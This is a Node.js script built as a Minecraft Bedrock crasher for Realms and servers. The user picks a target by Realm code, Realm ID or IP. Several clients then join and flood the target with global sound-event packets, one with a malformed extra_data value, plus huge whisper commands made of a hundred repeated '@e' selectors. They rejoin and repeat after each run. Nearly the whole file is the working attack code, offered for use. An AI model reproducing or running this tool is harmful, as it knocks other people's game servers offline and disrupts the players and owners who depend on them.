const protocol = require("bedrock-protocol"), { Authflow } = require('prismarine-auth'), { RealmAPI } = require("prismarine-realms"), fs = require("fs"), yaml = require("js-yaml");

const onErrorCB = [], onError = (callback) => onErrorCB.push(callback);

const wait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const runCommand = (client, command) => {
    client.write('command_request', {
        command: command,
        origin: {
            type: 5,
            uuid: '',
            request_id: '',
        },
        internal: false,
        version: 66,
    });
};

const levelSoundEvent = (client, data) => {
    client.write('level_sound_event', data);
};
/** @type {Record<FileName: string, { PACKETS?: number, DELAY?: number, CLIENT_AMOUNT: 5, ACCOUNT?: any, TARGET?: { REALM_ID?: number, REALM_INVITE?: string, HOST?: string, PORT?: number, CLIENT_AMOUNT?: number }}>} */
const configs = {}
for (const file of fs.readdirSync('./configs')) {
    const data = yaml.load(fs.readFileSync(`./configs/${file}`, 'utf8'));
    configs[file.split('.').slice(0, -1)] = data;
}
const crash = async (options) => {
    options.skipPing = true;
    const delay = !!options.delay;

    const run = async (count = 3) => {
        console.log(`${new Date().toLocaleTimeString()} > Starting ${count} clients...`);
        const client = new MultiClient(count, options);

        async function disconnected(data = "None") {
            if (Date.now() - this.lastCall < 2000) return;
            this.lastCall = Date.now();
            console.log(`${new Date().toLocaleTimeString()} > ${client.clients[0].profile.name } disconnected! >>`, data);
            await client.destroy;
            if (data === "server_id_conflict" || data === "server_full") await wait(3000);
            await wait(5000);
            await run(count);
        }

        onError((e) => {
            console.error(e);
        });

        client.once("kick", async (client, packet) => {
            console.log(`${new Date().toLocaleTimeString()} > ${client.profile.name} kicked!`, packet?.reason || "Unknown");
            return disconnected(packet);
        });

        client.once("disconnect", async (client, packet) => {
            if (typeof packet !== "string") packet = packet?.reason || "Unknown";
            return disconnected(packet);
        });

        client.on("play_status", async (client, data) => {
            if (data.status !== "login_success") return;
            await wait(3);
            console.log(`${new Date().toLocaleTimeString()} > ${client.profile.name} joined! Sending packets...`);
            let i = 0;
            while (i < options.packets) {
                const pos = data.player_position ?? { x: 0, y: 0, z: 0 };
                levelSoundEvent(client, {
                    position: pos,
                    extra_data: -1,
                    sound_id: "Death",
                    entity_type: "minecraft:ender_dragon",
                    is_global: true,
                });
                levelSoundEvent(client, {
                    sound_id: "BundleRemoveOne",
                    entity_type: "",
                    position: pos,
                    is_global: true,
                    extra_data: -1124852450,
                    is_baby_mob: false,
                });
                runCommand(client, `w @a ${"@e".repeat(10).repeat(10)}`, ``);
                i++;
                if (delay) await wait(options.delay);
            }
            return disconnected(`Finished sending ${i} packets! Rejoining to repeat...`);
        });
    };

    run(options.count);
};
/** @type {ClientOptions} */
const options = {
    "profilesFolder": "./profiles",
    "username": "MinecraftOMG",
    "skipPing": true,
    "viewDistance": 32767,
    authTitle: "00000000441cc96b",
    deviceType: "FortniteLevel3",
    flow: "live",
};
const GETOPTION = {
    "TARGET": async (options) => {
        options.TARGET = {};
        console.log(`Enter Target Type\n    1. Realm Code | 2. Server | 3. Realm ID`);
        const input = await cin();
        switch (input) {
            case "1":
                console.log(`Enter Realm Code`);
                const invite = await cin();
                options.TARGET.REALM_INVITE = invite;
                break;
            case "2":
                console.log(`Enter Server IP`);
                const ip = await cin();
                options.TARGET.HOST = ip;
                console.log(`Enter Server Port`);
                const port = await cin();
                options.TARGET.PORT = parseInt(port).toString()
                break;
            case "3":
                console.log(`Enter Realm ID`);
                const id = await cin();
                options.TARGET.REALM_ID = parseInt(id);
                break;
            default:
                console.log(`Invalid Input ${input} | Exiting...`);
                await wait(5000);
                process.exit(1);
                return;
        }
        return options;
    },
    "ACCOUNT": async (options) => {
        console.log(`Enter the account to use`);
        options.ACCOUNT = await cin();
        return options;
    },
    "DELAY": async (options) => {
        console.log(`Enter the delay between packets`);
        options.DELAY = parseInt(await cin());
        return options;
    },
    "PACKETS": async (options) => {
        console.log(`Enter the amount of packets to send`);
        options.PACKETS = parseInt(await cin());
        return options;
    },
    "CLIENT_AMOUNT": async (options) => {
        console.log(`Enter the amount of clients to use`);
        options.CLIENT_AMOUNT = parseInt(await cin());
        return options;
    }

}

const getRunConfig = async (data) => {
    data ||= {}
    const inputOptions = Object.keys(data)
    const filteredOptions = ["TARGET", "ACCOUNT", "DELAY", "PACKETS", "CLIENT_AMOUNT"].filter(option => !inputOptions.includes(option))
    for (const option of filteredOptions) {
        await GETOPTION[option](data)
    }
    const r = { username: data.ACCOUNT, delay: data.DELAY, packets: data.PACKETS, amount: data.CLIENT_AMOUNT  }
    if (data.TARGET.REALM_INVITE) r.realms = { realmInvite: data.TARGET.REALM_INVITE }
    if (data.TARGET.REALM_ID) r.realms = { realmId: data.TARGET.REALM_ID }
    if (data.TARGET.HOST) r.host = data.TARGET.HOST
    if (data.TARGET.PORT) r.port = data.TARGET.PORT
    return {...options, ...r}
}


process.on("uncaughtException", (e) => {
    for (const errorCB of onErrorCB) errorCB(e);
    console.error(e);
});

process.on("unhandledRejection", (e) => {
    for (const errorCB of onErrorCB) errorCB(e);
    console.error(e);
});

const cin = () => new Promise((resolve) => {
    process.stdin.once("data", (data) => resolve(data.toString().trim()));
});

const flow = new Authflow(options.username, options.profilesFolder, {
    flow: "live",
    authTitle: "00000000441cc96b"
}, options.onMsaCode);

const api = RealmAPI.from(flow, 'bedrock');

api.getRealms().then(async (d) => {
    const realmData = d.map(r => {
        return {
            Name: r.name,
            ID: r.id,
            State: r.state
        };
    });

    console.table(realmData);
    const configData = Object.entries(configs).map(([name, data]) => {
        data ||= {}
        return {
            Name: name,
            PACKETS: data.PACKETS,
            DELAY: data.DELAY,
            CLIENT_AMOUNT: data.CLIENT_AMOUNT,
            ACCOUNT: data.ACCOUNT,
            TARGET: data.TARGET
        }
    })
    console.table(configData);
    console.log(`Enter the config to use. ( eg. crash ) ( if config cannot be found, it will use no config )`);
    const config = await cin();
    getRunConfig(configs[config]).then(crash)
});

const __o__emit = protocol.Client.prototype.emit;

protocol.Client.prototype.emit = function (event, ...data) {
    if (this.parentClass) this.parentClass.emit(event, this, ...data);
    return __o__emit.call(this, event, ...data);
};

class MultiClient {
    constructor(amountOfClients, options) {
        this.clients = [];
        this.events = {};

        const createClients = async () => {
            let i = 0;
            while (i < amountOfClients) {
                i++;
                const c = new protocol.createClient(options);
                c.parentClass = this;
                this.clients.push(c);
                await wait();
            }
        };

        createClients();
    }

    emit(event, client, ...data) {
        for (const cB of this.events[event] ?? []) cB(client, ...data);
    }

    on(event, callback) {
        if (!this.events[event]) this.events[event] = [];
        this.events[event].push(callback);
    }

    once(event, callback) {
        if (!this.events[event]) this.events[event] = [];
        this.events[event].push((client, ...data) => {
            callback(client, ...data);
            this.events[event].splice(this.events[event].indexOf(callback), 1);
        });
    }

    get destroy() {
        return new Promise(async (resolve) => {
            for (const c of this.clients) {
                await c.removeAllListeners();
                await c.close();
            }
            resolve();
        });
    }
}
